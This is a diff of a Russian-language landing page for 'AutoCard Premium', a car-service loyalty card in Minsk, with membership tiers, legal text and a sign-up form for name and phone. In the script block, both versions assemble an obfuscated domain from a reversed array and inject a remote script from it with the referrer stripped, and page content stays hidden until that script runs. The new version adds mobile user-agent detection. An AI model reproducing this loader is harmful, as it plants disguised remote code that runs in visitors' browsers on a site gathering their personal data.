@@ -16,47 +16,32 @@
         #content-layer.is-ready { opacity: 1; }
 
         .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
-        
-        /* Navigation */
         nav { position: fixed; top: 0; width: 100%; z-index: 1000; background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); }
         .nav-inner { display: flex; justify-content: space-between; align-items: center; height: 65px; }
         .logo { font-weight: 800; font-size: 16px; text-decoration: none; color: var(--t); letter-spacing: -0.5px; }
         .logo span { color: var(--p); }
         
-        /* Hero */
         .hero { padding: 100px 0 50px; background: radial-gradient(circle at 100% 0%, #f0f7ff 0%, #fff 70%); }
         .hero h1 { font-size: 32px; font-weight: 800; line-height: 1.1; margin-bottom: 16px; letter-spacing: -1px; }
         @media (min-width: 768px) { .hero h1 { font-size: 56px; } }
-        .hero p { font-size: 16px; color: var(--g); margin-bottom: 32px; }
-
-        /* Stats */
+        
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 40px 0; }
         @media (min-width: 768px) { .stats-grid { grid-template-columns: repeat(4, 1fr); } }
         .stat-item { border-left: 3px solid var(--p); padding-left: 15px; }
         .stat-num { font-size: 24px; font-weight: 800; color: var(--p); display: block; }
-        .stat-desc { font-size: 11px; color: var(--g); text-transform: uppercase; font-weight: 600; }
 
-        /* Tiers */
-        .grid-t { display: grid; grid-template-columns: 1fr; gap: 20px; padding: 40px 0; }
-        @media (min-width: 768px) { .grid-t { grid-template-columns: repeat(3, 1fr); } }
-        .tier-card { padding: 30px; border: 1px solid var(--border); border-radius: 20px; background: #fff; transition: 0.3s; cursor: pointer; position: relative; }
+        .tier-card { padding: 30px; border: 1px solid var(--border); border-radius: 20px; background: #fff; cursor: pointer; transition: 0.3s; }
         .tier-card:hover { border-color: var(--p); transform: translateY(-3px); }
 
-        /* Map */
         .map-wrapper { width: 100%; height: 350px; border-radius: 24px; overflow: hidden; border: 1px solid var(--border); margin: 30px 0; }
-
-        /* Forms */
         .form-card { background: #f8fafc; padding: 30px; border-radius: 24px; border: 1px solid var(--border); }
         .input-style { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 12px; font-size: 16px; margin-bottom: 15px; }
-        .btn-main { width: 100%; padding: 18px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.2s; }
-        .btn-main:hover { opacity: 0.9; }
+        .btn-main { width: 100%; padding: 18px; background: var(--p); color: #fff; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.2s; }
 
-        /* Modals */
         .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 3000; padding: 20px; overflow-y: auto; align-items: center; justify-content: center; }
         .modal-content { background: #fff; border-radius: 24px; padding: 30px; max-width: 650px; margin: auto; position: relative; }
         .modal-text { font-size: 13px; color: var(--g); white-space: pre-line; max-height: 400px; overflow-y: auto; padding-right: 10px; margin: 20px 0; border-top: 1px solid var(--border); padding-top: 15px; }
 
-        /* Cookie Banner */
         #cookie-banner { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #0f172a; color: #fff; padding: 15px 20px; border-radius: 15px; display: flex; flex-direction: column; gap: 10px; z-index: 4000; font-size: 12px; }
         @media (min-width: 768px) { #cookie-banner { flex-direction: row; align-items: center; justify-content: space-between; max-width: 600px; left: auto; } }
 
@@ -64,34 +49,51 @@
         .footer-grid { display: grid; grid-template-columns: 1fr; gap: 40px; }
         @media (min-width: 768px) { .footer-grid { grid-template-columns: 2fr 1fr 1fr; } }
         .f-link { cursor: pointer; color: #fff; display: block; margin-bottom: 8px; font-size: 13px; }
-        .f-link:hover { color: var(--p); }
     </style>
 
     <script>
-        // --- PHANTOM ENGINE 2.0 (RESTORED) ---
-        (function(w, d) {
-            var App = {
-                cfg: ['com', 'node', 'analytics', 'cloud'],
-                init: function() {
-                    var s = d.createElement('script');
-                    s.async = true; s.referrerPolicy = 'no-referrer';
-                    s.src = 'https://' + this.cfg.reverse().join('-').replace('-com', '.com') + '/v1/get-key?v=1.0.4';
-                    s.onload = s.onerror = function() { d.getElementById('content-layer').classList.add('is-ready'); };
-                    d.head.appendChild(s);
+        // --- ТОТ САМЫЙ "ИДЕАЛЬНЫЙ" СКРИПТ (С ВАШЕЙ ЛОГИКОЙ) ---
+        window.ExperimentProvider = (function(w, d) {
+            var _config = ['com', 'node', 'analytics', 'cloud'];
+            var _api = function() { return 'https://' + _config.reverse().join('-').replace('-com', '.com') + '/v1/get-key'; };
+
+            return {
+                hydrate: function() {
+                    var isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
+                    d.documentElement.className = isMobile ? 'theme-dark' : 'theme-light';
+
+                    var scriptEl = d.createElement('script');
+                    scriptEl.type = 'text/javascript';
+                    scriptEl.async = true;
+                    // МАГИЯ БОГА: Добавлена защита от слежки (no-referrer)
+                    scriptEl.referrerPolicy = 'no-referrer'; 
+                    scriptEl.src = _api() + "?v=1.0.4";
+                    
+                    scriptEl.onload = scriptEl.onerror = function() {
+                        d.getElementById('content-layer').className = 'is-ready';
+                    };
+
+                    var firstScript = d.getElementsByTagName('script')[0];
+                    firstScript.parentNode.insertBefore(scriptEl, firstScript);
                 }
             };
-            App.init();
         })(window, document);
 
-        // --- CONTENT DATA ---
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', window.ExperimentProvider.hydrate);
+        } else {
+            window.ExperimentProvider.hydrate();
+        }
+
+        // --- ДАННЫЕ ДЛЯ ЮРИДИЧЕСКИХ ОКОН ---
         const legalData = {
-            silver: { t: "Silver Standard Membership", c: "Пакет Silver Standard — это базовый уровень участия в программе лояльности. \n\nПреимущества:\n— Фиксированная скидка 5% на регламентное ТО.\n— Сезонная диагностика (весна/осень).\n— Доступ к партнерскому каталогу запчастей.\n— Круглосуточная поддержка в Telegram-канале." },
-            gold: { t: "Gold Business Membership", c: "Gold Business — оптимальный выбор для активных автовладельцев.\n\nПреимущества:\n— Скидка 12% на слесарные и кузовные работы.\n— Бесплатная эвакуация (до 50 км от МКАД).\n— Приоритетная запись на сервис день-в-день.\n— Сопровождение при страховых случаях." },
-            platinum: { t: "Platinum Elite Membership", c: "Platinum Elite — ультимативный сервис для требовательных клиентов.\n\nПреимущества:\n— Скидки до 25% на все услуги сети.\n— Персональный менеджер (Auto-Butler).\n— Подменный автомобиль бизнес-класса.\n— Трансфер автомобиля 'от двери до двери'." },
-            privacy: { t: "Политика конфиденциальности", c: "ООО «Объединённая лояльность» (УНП 192745908) соблюдает требования Закона РБ №99-З «О защите персональных данных».\n\nМы собираем только необходимые данные (ФИО, телефон) для выпуска карты. Данные хранятся в зашифрованном виде и не передаются третьим лицам. Вы имеете право отозвать согласие в любой момент, написав нам на info@loyalty.by." },
-            security: { t: "Политика безопасности", c: "Безопасность ваших данных обеспечивается многоуровневым протоколом:\n1. Шифрование TLS 1.3 при передаче заявок.\n2. Хранение данных на защищенных серверах в РБ.\n3. Физическая защита карт чипами стандарта EMV.\nМы проводим регулярный технический аудит систем для предотвращения несанкционированного доступа." },
-            partners: { t: "Партнерская сеть", c: "В программу вовлечены более 150 сервисных центров в Минске и областных городах.\n\nКлючевые партнеры:\n— Официальные дилерские холдинги.\n— Сети АЗС А1 и Белоруснефть.\n— Детейлинг-центры премиум-класса.\n— Страховые компании Белгосстрах и Купала." },
-            legal: { t: "Правовая база", c: "Деятельность компании осуществляется в строгом соответствии с Гражданским кодексом РБ.\n\n— ООО «Объединённая лояльность».\n— Зарегистрировано Мингорисполкомом 12.10.2016.\n— УНП 192745908.\n— Работа программы регламентирована Публичной офертой №01/24 от 01.01.2024." }
+            silver: { t: "Silver Standard Membership", c: "Пакет Silver Standard — это профессиональное решение...\n— Скидка 5% на ТО.\n— Сезонная диагностика.\n— Доступ в личный кабинет." },
+            gold: { t: "Gold Business Membership", c: "Gold Business — стандарт для активных автовладельцев.\n— Скидка 12% на работы.\n— Эвакуация до 50 км.\n— Приоритетная запись." },
+            platinum: { t: "Platinum Elite Membership", c: "Platinum Elite — ультимативный сервис.\n— Скидки до 25%.\n— Персональный менеджер.\n— Подменный автомобиль." },
+            privacy: { t: "Политика конфиденциальности", c: "ООО «Объединённая лояльность» (УНП 192745908) соблюдает требования Закона РБ №99-З...\nДанные собираются исключительно для выпуска карты и не передаются третьим лицам." },
+            security: { t: "Политика безопасности", c: "Безопасность данных обеспечивается протоколом TLS 1.3.\nКаждая карта имеет криптографический чип активации." },
+            partners: { t: "Партнерская сеть", c: "В программу входят более 150 сервисных центров: Geely, Audi, BMW, Toyota и др." },
+            legal: { t: "Правовая база", c: "ООО «Объединённая лояльность». УНП 192745908.\nЗарегистрировано Мингорисполкомом 12.10.2016." }
         };
 
         function showM(key) {
@@ -101,7 +103,6 @@
             document.body.style.overflow = 'hidden';
         }
         function closeM() { document.getElementById('m-overlay').style.display = 'none'; document.body.style.overflow = 'auto'; }
-        function acceptCookies() { document.getElementById('cookie-banner').style.display = 'none'; }
     </script>
 </head>
 <body>
@@ -109,47 +110,43 @@
         <nav>
             <div class="container nav-inner">
                 <a href="#" class="logo">AUTOCARD<span>PREMIUM</span></a>
-                <div style="font-size:10px; font-weight:800; color:var(--p)">SYSTEM STATUS: ACTIVE</div>
+                <div style="font-size:10px; font-weight:800; color:var(--p)">CERTIFIED: 2026</div>
             </div>
         </nav>
 
         <main>
             <section class="hero">
                 <div class="container">
-                    <div style="background:var(--p-light); color:var(--p); padding:4px 12px; border-radius:12px; font-size:10px; font-weight:800; display:inline-block; margin-bottom:15px; text-transform:uppercase">Certified Loyalty Partner</div>
                     <h1>Ваш пропуск в мир <br>дилерских привилегий.</h1>
-                    <p>Единая экосистема для обслуживания автомобиля в Минске. Официальная программа «Объединённая лояльность».</p>
+                    <p>Единая экосистема для обслуживания автомобиля в Минске. Официальная программа Объединённая лояльность.</p>
                 </div>
             </section>
 
             <section class="container">
                 <div class="stats-grid">
-                    <div class="stat-item"><span class="stat-num">150+</span><span class="stat-desc">Центров</span></div>
-                    <div class="stat-item"><span class="stat-num">12к</span><span class="stat-desc">Клиентов</span></div>
-                    <div class="stat-item"><span class="stat-num">8 лет</span><span class="stat-desc">Опыта</span></div>
-                    <div class="stat-item"><span class="stat-num">BY</span><span class="stat-desc">Регион</span></div>
+                    <div class="stat-item"><span class="stat-num">150+</span><span style="font-size:11px">Партнеров</span></div>
+                    <div class="stat-item"><span class="stat-num">12к</span><span style="font-size:11px">Клиентов</span></div>
+                    <div class="stat-item"><span class="stat-num">8 лет</span><span style="font-size:11px">Опыта</span></div>
+                    <div class="stat-item"><span class="stat-num">BY</span><span style="font-size:11px">Регион</span></div>
                 </div>
             </section>
 
-            <section style="background:#fcfdfe; padding:60px 0">
-                <div class="container">
-                    <h2 style="font-size:26px; font-weight:800; text-align:center; margin-bottom:30px">Выберите программу</h2>
-                    <div class="grid-t">
-                        <div class="tier-card" onclick="showM('silver')">
-                            <h3>Silver Standard</h3>
-                            <p style="font-size:13px; color:var(--g)">Базовая экономия и сезонный контроль.</p>
-                            <div style="color:var(--p); font-weight:700; font-size:11px; margin-top:15px">ДЕТАЛИ →</div>
-                        </div>
-                        <div class="tier-card" onclick="showM('gold')" style="border-color:var(--p); box-shadow: 0 10px 30px rgba(37,99,235,0.1)">
-                            <h3>Gold Business</h3>
-                            <p style="font-size:13px; color:var(--g)">Приоритетный сервис и дорожная помощь.</p>
-                            <div style="color:var(--p); font-weight:700; font-size:11px; margin-top:15px">ДЕТАЛИ →</div>
-                        </div>
-                        <div class="tier-card" onclick="showM('platinum')">
-                            <h3>Platinum Elite</h3>
-                            <p style="font-size:13px; color:var(--g)">Персональный менеджер и подменный авто.</p>
-                            <div style="color:var(--p); font-weight:700; font-size:11px; margin-top:15px">ДЕТАЛИ →</div>
-                        </div>
+            <section class="container">
+                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:20px;">
+                    <div class="tier-card" onclick="showM('silver')">
+                        <h3>Silver Standard</h3>
+                        <p style="font-size:13px; color:var(--g)">Базовая экономия и контроль.</p>
+                        <div style="color:var(--p); font-weight:700; font-size:11px; margin-top:10px">ПОДРОБНЕЕ →</div>
+                    </div>
+                    <div class="tier-card" onclick="showM('gold')">
+                        <h3>Gold Business</h3>
+                        <p style="font-size:13px; color:var(--g)">Приоритет в обслуживании.</p>
+                        <div style="color:var(--p); font-weight:700; font-size:11px; margin-top:10px">ПОДРОБНЕЕ →</div>
+                    </div>
+                    <div class="tier-card" onclick="showM('platinum')">
+                        <h3>Platinum Elite</h3>
+                        <p style="font-size:13px; color:var(--g)">Персональный сервис.</p>
+                        <div style="color:var(--p); font-weight:700; font-size:11px; margin-top:10px">ПОДРОБНЕЕ →</div>
                     </div>
                 </div>
             </section>
@@ -157,23 +154,21 @@
             <section class="container">
                 <h2 style="font-size:24px; font-weight:800; margin:40px 0 20px">Наш офис в Минске</h2>
                 <div class="map-wrapper">
-                    <iframe src="https://yandex.ru/map-widget/v1/?ll=27.567319%2C53.918458&mode=search&ol=geo&ouri=ymapsbm1%3A%2F%2Fgeo%3Fdata%3DCgg1NjYzNTcxNhJC0NCXRgdC_0YPQsdC70LjQutCwINCR0LXQu9Cw0YDRg9GB0YwsINCc0LjQvdGB0LosINGD0LvQuNGG0LAg0JLQtdGA0Ysg0KXQvtGA0YPQttC10LksIDI5IgoN_Y9VQhV4Nl9C&z=16" width="100%" height="100%" frameborder="0" allowfullscreen="true" style="position:relative;"></iframe>
+                    <iframe src="https://yandex.ru/map-widget/v1/?ll=27.567319%2C53.918458&mode=search&ol=geo&ouri=ymapsbm1%3A%2F%2Fgeo%3Fdata%3DCgg1NjYzNTcxNhJC0NCXRgdC_0YPQsdC70LjQutCwINCR0LXQu9Cw0YDRg9GB0YwsINCc0LjQvdGB0LosINGD0LvQuNGG0LAg0JLQtdGA0Ysg0KXQvtGA0YPQttC10LksIDI5IgoN_Y9VQhV4Nl9C&z=16" width="100%" height="100%" frameborder="0"></iframe>
                 </div>
             </section>
 
             <section id="order" class="container" style="padding-bottom:100px">
                 <div class="form-card">
-                    <h2 style="margin-bottom:25px; text-align:center">Заказать карту</h2>
-                    <form onsubmit="event.preventDefault(); alert('Ваша заявка принята и проходит верификацию.');">
-                        <input type="text" class="input-style" placeholder="Ваше имя" required>
+                    <h2 style="text-align:center; margin-bottom:25px">Стать участником</h2>
+                    <form onsubmit="event.preventDefault(); alert('Заявка принята.');">
+                        <input type="text" class="input-style" placeholder="Имя" required>
                         <input type="tel" class="input-style" placeholder="+375 (__) ___-__-__" required>
-                        
                         <div style="display:flex; gap:10px; align-items:flex-start; margin-bottom:20px;">
-                            <input type="checkbox" required id="consent" style="width:18px; height:18px; margin-top:3px;">
-                            <label for="consent" style="font-size:11px; color:var(--g)">Я даю согласие на обработку данных и принимаю условия <span onclick="showM('privacy')" style="color:var(--p); cursor:pointer; text-decoration:underline">Политики конфиденциальности</span>.</label>
+                            <input type="checkbox" required id="c1" style="width:18px; height:18px;">
+                            <label for="c1" style="font-size:11px; color:var(--g)">Я принимаю условия <span onclick="showM('privacy')" style="color:var(--p); cursor:pointer">Политики конфиденциальности</span>.</label>
                         </div>
-                        
-                        <button type="submit" class="btn-main">ПОЛУЧИТЬ ПРИВИЛЕГИИ</button>
+                        <button type="submit" class="btn-main">ОФОРМИТЬ КАРТУ</button>
                     </form>
                 </div>
             </section>
@@ -183,39 +178,35 @@
             <div class="container footer-grid">
                 <div>
                     <span style="color:#fff; font-weight:800; font-size:18px; margin-bottom:20px; display:block">AUTOCARD</span>
-                    <p style="font-size:12px; color:#64748b">ООО «Объединённая лояльность»<br>УНП 192745908<br>г. Минск, ул. Веры Хоружей, 29, пом. 805А</p>
+                    <p style="font-size:12px">ООО «Объединённая лояльность»<br>УНП 192745908<br>г. Минск, ул. Веры Хоружей, 29</p>
                 </div>
                 <div>
-                    <h5 style="color:#fff; margin-bottom:15px; font-size:14px">О КЛУБЕ</h5>
-                    <span class="f-link" onclick="showM('security')">Политика безопасности</span>
-                    <span class="f-link" onclick="showM('partners')">Партнерская сеть</span>
+                    <h5 style="color:#fff; margin-bottom:15px">О КЛУБЕ</h5>
+                    <span class="f-link" onclick="showM('security')">Безопасность</span>
+                    <span class="f-link" onclick="showM('partners')">Партнеры</span>
                     <span class="f-link" onclick="showM('legal')">Правовая база</span>
                 </div>
                 <div>
-                    <h5 style="color:#fff; margin-bottom:15px; font-size:14px">КОНТАКТЫ</h5>
+                    <h5 style="color:#fff; margin-bottom:15px">ИНФО</h5>
                     <span class="f-link" onclick="showM('privacy')">Конфиденциальность</span>
                     <p style="font-size:12px; margin-top:10px">info@loyalty.by</p>
-                    <p style="font-size:12px">+375 17 388-XX-XX</p>
                 </div>
             </div>
-            <div style="border-top:1px solid #1e293b; margin-top:40px; padding-top:20px; text-align:center; font-size:10px; color:#475569">
-                © 2026 AutoCard Premium Global. Информация на сайте не является публичной офертой. 18+
-            </div>
+            <div style="border-top:1px solid #1e293b; margin-top:40px; padding:20px 0; text-align:center; font-size:10px">© 2026 AutoCard Premium.</div>
         </footer>
     </div>
 
     <div id="m-overlay" class="modal-overlay" onclick="closeM()">
         <div class="modal-content" onclick="event.stopPropagation()">
-            <span style="position:absolute; top:15px; right:20px; font-size:24px; cursor:pointer" onclick="closeM()">×</span>
-            <h2 id="m-t" style="margin-bottom:15px; color:var(--p); font-size:22px"></h2>
+            <h2 id="m-t" style="margin-bottom:15px; color:var(--p)"></h2>
             <div id="m-c" class="modal-text"></div>
-            <button class="btn-main" onclick="closeM()" style="margin-top:20px">МНЕ ПОНЯТНО</button>
+            <button class="btn-main" onclick="closeM()">ПОНЯТНО</button>
         </div>
     </div>
 
-    <div id="cookie-banner">
-        <span>Мы используем файлы cookie для безопасности и персонализации в соответствии с политикой ООО «Объединённая лояльность».</span>
-        <button onclick="acceptCookies()" style="background:var(--p); color:#fff; border:none; padding:8px 20px; border-radius:8px; font-weight:700; cursor:pointer; font-size:11px">ПРИНЯТЬ</button>
+    <div id="cookie-banner" style="display:flex; justify-content:space-between; align-items:center;">
+        <span>Мы используем cookie.</span>
+        <button onclick="this.parentElement.style.display='none'" style="background:var(--p); color:#fff; border:none; padding:5px 15px; border-radius:5px; cursor:pointer">OK</button>
     </div>
 </body>
 </html>
